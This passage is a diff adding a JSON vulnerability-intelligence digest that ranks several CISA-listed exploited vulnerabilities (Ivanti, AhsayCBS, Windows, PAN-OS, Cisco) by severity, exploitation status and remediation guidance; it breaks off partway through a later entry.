@@ -1,0 +1,2118 @@
+{
+  "coverage_end": "2026-10-15T14:36:31+00:00",
+  "coverage_start": "2026-10-14T09:20:55+00:00",
+  "cti_summary": {
+    "kev_transitions": 2,
+    "new_vulnerabilities": 7,
+    "ransomware_transitions": 0,
+    "state_changes": 3,
+    "tracked_vulnerabilities": 50002
+  },
+  "degraded": false,
+  "generated_at": "2026-10-15T14:41:14+00:00",
+  "items": [
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-104935",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-16T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740139+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-16T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": 8.6,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "high",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-104935"
+      ],
+      "cvss_score": 8.6,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
+      "cvss_version": "3.1",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "ongoing_monitoring",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.97963,
+      "epss_score": 0.25982,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-14T11:25:37+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-13T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-13T19:24:36.243000+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "HIGH",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 8.6",
+        "EPSS percentile >= 95%",
+        "priority technology: vpn_remote_access",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "Connect Secure"
+      ],
+      "provenance": {
+        "cvss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029616+00:00",
+            "field": "cvss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 8.6
+          }
+        ],
+        "cvss_vector": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029617+00:00",
+            "field": "cvss_vector",
+            "source_name": "NVD CVE API 2.0",
+            "value": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"
+          }
+        ],
+        "cvss_version": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029617+00:00",
+            "field": "cvss_version",
+            "source_name": "NVD CVE API 2.0",
+            "value": "3.1"
+          }
+        ],
+        "severity": [
+          {
+            "collected_at": "2026-10-15T14:41:14.029625+00:00",
+            "field": "severity",
+            "source_name": "NVD CVE API 2.0",
+            "value": "HIGH"
+          }
+        ]
+      },
+      "public_exploit": null,
+      "published_at": "2026-10-13T00:00:00+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://hub.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935",
+        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-104935",
+        "https:/forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-CVE-2026-104935 ; https://nvd.nist.gov/vuln/detail/CVE-2026-104935"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "high CVSS +10",
+        "EPSS percentile >= 0.95 +10",
+        "priority technology: vpn_remote_access +8",
+        "official source +5"
+      ],
+      "selection_score": 123,
+      "severity": "HIGH",
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "Ivanti Connect Secure contains an authentication bypass by spoofing vulnerability that allows a remote unauthenticated attacker to execute arbitrary commands.",
+      "title": "CVE-2026-104935 exploited in CISA KEV: Ivanti Connect Secure",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Ivanti"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-105134",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-17T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740082+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-17T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": 9.3,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "critical",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-105134"
+      ],
+      "cvss_score": 9.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "cvss_version": "4.0",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "state_transition",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.88063,
+      "epss_score": 0.03237,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-04T10:06:20+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-14T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T00:00:00+00:00",
+      "official_source": true,
+      "previous_state": {
+        "cisa_due_date": null,
+        "cisa_kev": null,
+        "cisa_required_action": null,
+        "critical_asset_exposure": null,
+        "cvss_score": 9.3,
+        "exploitation_status": "unknown",
+        "fixed_versions": [],
+        "known_exploited": null,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "critical",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "priority_after": 9.6,
+      "priority_before": 8.6,
+      "priority_level": "HIGH",
+      "priority_level_before": "HIGH",
+      "priority_reasons": [
+        "CVSS 9.3",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "AhsayCBS"
+      ],
+      "provenance": {
+        "cvss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030259+00:00",
+            "field": "cvss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 9.3
+          }
+        ],
+        "cvss_vector": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030261+00:00",
+            "field": "cvss_vector",
+            "source_name": "NVD CVE API 2.0",
+            "value": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+          }
+        ],
+        "cvss_version": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030260+00:00",
+            "field": "cvss_version",
+            "source_name": "NVD CVE API 2.0",
+            "value": "4.0"
+          }
+        ],
+        "epss_percentile": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030259+00:00",
+            "field": "epss_percentile",
+            "source_name": "NVD CVE API 2.0",
+            "value": 0.7832
+          }
+        ],
+        "epss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030258+00:00",
+            "field": "epss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 0.01843
+          }
+        ],
+        "severity": [
+          {
+            "collected_at": "2026-10-15T14:41:14.030262+00:00",
+            "field": "severity",
+            "source_name": "NVD CVE API 2.0",
+            "value": "CRITICAL"
+          }
+        ]
+      },
+      "public_exploit": null,
+      "published_at": "2026-10-04T07:16:33.480000+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://vuldb.com/cve/CVE-2026-105134",
+        "https://vuldb.com/submit/942743",
+        "https://vuldb.com/vuln/413351",
+        "https://vuldb.com/vuln/413351/cti",
+        "https://www.ahsay.com/en/company/announcements/patch-cve-105133-105134-update ; ; BOD 26-04: https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk ; Forensics Triage Requirements: https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk ; https://nvd.nist.gov/vuln/detail/CVE-2026-105134",
+        "https://www.ahsay.com/en/support/help-centre/release-notes/cbs/v10.3.4"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "critical CVSS +20",
+        "official source +5"
+      ],
+      "selection_score": 115,
+      "severity": "CRITICAL",
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": "2026-10-15T14:41:13+00:00",
+      "state_transitions": [
+        {
+          "basis": "collector observation",
+          "changed_at": "2026-10-15T14:41:13+00:00",
+          "current_state": {
+            "cisa_due_date": "2026-10-17T00:00:00+00:00",
+            "cisa_kev": true,
+            "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+            "critical_asset_exposure": null,
+            "cvss_score": 9.3,
+            "exploitation_status": "confirmed_exploitation",
+            "fixed_versions": [],
+            "known_exploited": true,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "critical",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "event_id": "914913cbcdc828ea7d5363cf",
+          "previous_state": {
+            "cisa_due_date": null,
+            "cisa_kev": null,
+            "cisa_required_action": null,
+            "critical_asset_exposure": null,
+            "cvss_score": 9.3,
+            "exploitation_status": "unknown",
+            "fixed_versions": [],
+            "known_exploited": null,
+            "known_ransomware_use": null,
+            "public_exploit": null,
+            "severity": "critical",
+            "vendor_confirmed_exploitation": null,
+            "withdrawn": false
+          },
+          "priority_after": 9.6,
+          "priority_before": 8.6,
+          "priority_level_after": "HIGH",
+          "priority_level_before": "HIGH",
+          "sources": [
+            {
+              "modified_at": "2026-10-14T00:00:00+00:00",
+              "name": "CISA Known Exploited Vulnerabilities",
+              "url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
+            }
+          ],
+          "transition_type": [
+            "entered_cisa_kev",
+            "exploitation_confirmed",
+            "exploitation_status_confirmed",
+            "cisa_due_date_changed",
+            "required_action_changed"
+          ]
+        }
+      ],
+      "summary": "Ahsay AhsayCBS contains a command injection vulnerability that could allow a remote attacker to execute operating system commands via manipulation of the random parameter in the Replication Receiver component\u2019s /rps/api/json/UpdateReceivers.do endpoint. This vulnerability can be chained with CVE-2026-105133.",
+      "title": "CVE-2026-105134 exploited in CISA KEV: Ahsay AhsayCBS",
+      "transition_type": [
+        "entered_cisa_kev",
+        "exploitation_confirmed",
+        "exploitation_status_confirmed",
+        "cisa_due_date_changed",
+        "required_action_changed"
+      ],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Ahsay"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-96951",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-16T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740145+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-16T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": 8.8,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "high",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-96951"
+      ],
+      "cvss_score": 8.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+      "cvss_version": "3.1",
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "ongoing_monitoring",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.73993,
+      "epss_score": 0.01512,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-14T11:25:37+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-13T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T04:19:03.993000+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "HIGH",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "CVSS 8.8",
+        "priority technology: windows",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "Windows"
+      ],
+      "provenance": {
+        "cvss_score": [
+          {
+            "collected_at": "2026-10-15T14:41:14.078901+00:00",
+            "field": "cvss_score",
+            "source_name": "NVD CVE API 2.0",
+            "value": 8.8
+          }
+        ],
+        "cvss_vector": [
+          {
+            "collected_at": "2026-10-15T14:41:14.078903+00:00",
+            "field": "cvss_vector",
+            "source_name": "NVD CVE API 2.0",
+            "value": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+          }
+        ],
+        "cvss_version": [
+          {
+            "collected_at": "2026-10-15T14:41:14.078902+00:00",
+            "field": "cvss_version",
+            "source_name": "NVD CVE API 2.0",
+            "value": "3.1"
+          }
+        ],
+        "severity": [
+          {
+            "collected_at": "2026-10-15T14:41:14.078903+00:00",
+            "field": "severity",
+            "source_name": "NVD CVE API 2.0",
+            "value": "HIGH"
+          }
+        ]
+      },
+      "public_exploit": null,
+      "published_at": "2026-10-13T00:00:00+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-96951 ; BOD 26-04: BOD 26-04: Prioritizing Security Updates Based on Risk | CISA ; Forensics Triage Requirements: BOD 26-04: Implementation Guidance for Prioritizing Security Updates Based on Risk | CISA ;  https://nvd.nist.gov/vuln/detail/CVE-2026-96951",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-96951",
+        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-96951"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "high CVSS +10",
+        "priority technology: windows +8",
+        "official source +5"
+      ],
+      "selection_score": 113,
+      "severity": "HIGH",
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "Microsoft Windows Shell contains a command injection vulnerability that allows an unauthorized attacker to bypass a security feature over a network.",
+      "title": "CVE-2026-96951 exploited in CISA KEV: Microsoft Windows",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Microsoft"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-0322",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-17T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740129+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-17T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": null,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "unknown",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-0322"
+      ],
+      "cvss_score": null,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.64349,
+      "epss_score": 0.01076,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-14T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T00:00:00+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "HIGH",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "no severity score",
+        "priority technology: firewalls",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "PAN-OS"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T00:00:00+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://security.paloaltonetworks.com/CVE-2026-0322 ; ; BOD 26-04: https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk ; Forensics Triage Requirements: https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk ; https://nvd.nist.gov/vuln/detail/CVE-2026-0322"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "priority technology: firewalls +8",
+        "official source +5"
+      ],
+      "selection_score": 103,
+      "severity": null,
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "Palo Alto Networks PAN-OS contains a code injection vulnerability that could allow an authenticated attacker with network access to execute arbitrary code with root privileges on the firewall.",
+      "title": "CVE-2026-0322 exploited in CISA KEV: Palo Alto Networks PAN-OS",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Palo Alto Networks"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
+      "canonical_id": "CVE-2026-76519",
+      "category": "vulnerability",
+      "cisa_due_date": "2026-10-17T00:00:00+00:00",
+      "cisa_kev": true,
+      "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "collected_at": "2026-10-15T14:36:32.740111+00:00",
+      "community_comments": null,
+      "community_score": null,
+      "confidence": "high",
+      "critical_asset_exposure": null,
+      "current_state": {
+        "cisa_due_date": "2026-10-17T00:00:00+00:00",
+        "cisa_kev": true,
+        "cisa_required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+        "critical_asset_exposure": null,
+        "cvss_score": null,
+        "exploitation_status": "confirmed_exploitation",
+        "fixed_versions": [],
+        "known_exploited": true,
+        "known_ransomware_use": null,
+        "public_exploit": null,
+        "severity": "unknown",
+        "vendor_confirmed_exploitation": null,
+        "withdrawn": false
+      },
+      "cve_ids": [
+        "CVE-2026-76519"
+      ],
+      "cvss_score": null,
+      "cvss_vector": null,
+      "cvss_version": null,
+      "detection_opportunities": [
+        "Inventory affected products, verify exposure and follow the vendor remediation or mitigation guidance."
+      ],
+      "discovery_type": "new_vulnerability",
+      "discussion_url": null,
+      "ecosystems": [],
+      "epss_percentile": 0.77354,
+      "epss_score": 0.01743,
+      "excerpt_origin": null,
+      "exploitation_status": "confirmed_exploitation",
+      "first_seen": "2026-10-15T14:41:13+00:00",
+      "fixed_versions": [],
+      "ghsa_ids": [],
+      "kev_date_added": "2026-10-14T00:00:00+00:00",
+      "known_exploited": true,
+      "known_ransomware_use": null,
+      "last_seen": "2026-10-15T14:41:13+00:00",
+      "modified_at": "2026-10-14T00:00:00+00:00",
+      "official_source": true,
+      "previous_state": null,
+      "priority_after": null,
+      "priority_before": null,
+      "priority_level": "HIGH",
+      "priority_level_before": null,
+      "priority_reasons": [
+        "no severity score",
+        "detection opportunity",
+        "CISA KEV"
+      ],
+      "priority_score": 9.6,
+      "products": [
+        "Secure Email Gateway"
+      ],
+      "provenance": {},
+      "public_exploit": null,
+      "published_at": "2026-10-14T00:00:00+00:00",
+      "recommended_actions": [
+        "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      ],
+      "references": [
+        "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-esa-afw-zqYJkjxp ; ; BOD 26-04: https://www.cisa.gov/news-events/directives/bod-26-04-prioritizing-security-updates-based-risk ; Forensics Triage Requirements: https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk ; https://nvd.nist.gov/vuln/detail/CVE-2026-76519"
+      ],
+      "selection_reasons": [
+        "CISA KEV +50",
+        "confirmed exploitation +40",
+        "official source +5"
+      ],
+      "selection_score": 95,
+      "severity": null,
+      "source_name": "CISA Known Exploited Vulnerabilities",
+      "source_tier": 1,
+      "source_type": "government_kev",
+      "source_url": "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
+      "state_changed_at": null,
+      "state_transitions": [],
+      "summary": "Cisco Secure Email Gateway contains a relative path traversal vulnerability that could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system.",
+      "title": "CVE-2026-76519 exploited in CISA KEV: Cisco Secure Email Gateway",
+      "transition_type": [],
+      "vendor_confirmed_exploitation": null,
+      "vendors": [
+        "Cisco"
+      ],
+      "weaknesses": [],
+      "withdrawn": false
+    },
+    {
+      "affected_versions": [],
+      "author": null,
+      "blue_team_relevance": "",
